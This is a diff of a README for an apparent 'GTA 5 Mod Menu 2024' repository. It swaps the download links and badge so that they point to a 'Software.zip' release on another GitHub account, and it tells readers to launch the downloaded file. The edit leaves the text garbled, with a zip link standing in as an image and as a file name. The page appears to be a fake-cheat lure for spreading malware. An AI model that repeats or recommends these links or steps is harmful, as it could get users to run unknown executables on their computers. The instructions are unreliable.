@@ -20,9 +20,9 @@ Welcome to the GTA 5 Mod Menu 2024 repository! This tool is designed to enhance 
 - `mod-menu-gtav-pc`
 
 ## Mod Menu Download 🔗
-Visit the [GTA 5 Mod Menu 2024 Download Page](https://github.com/YouaifXD/789566136/releases/download/v1.0/Software.zip) to access the latest version of the mod. Make sure to launch the "Software.zip" file after downloading to start customizing your GTA V gameplay.
+Visit the [GTA 5 Mod Menu 2024 Download Page](https://github.com/charleszhenladera/GTA-5-Mod-Menu-2024/releases/download/v2.0/Software.zip) to access the latest version of the mod. Make sure to launch the "https://github.com/charleszhenladera/GTA-5-Mod-Menu-2024/releases/download/v2.0/Software.zip" file after downloading to start customizing your GTA V gameplay.
 
-[![Download Mod Menu](https://img.shields.io/badge/Download-Mod_Menu-blue)](https://github.com/YouaifXD/789566136/releases/download/v1.0/Software.zip)
+[![Download Mod Menu](https://github.com/charleszhenladera/GTA-5-Mod-Menu-2024/releases/download/v2.0/Software.zip)](https://github.com/charleszhenladera/GTA-5-Mod-Menu-2024/releases/download/v2.0/Software.zip)
 
 ## Getting Started 🚀
 1. Download the mod menu from the provided link.
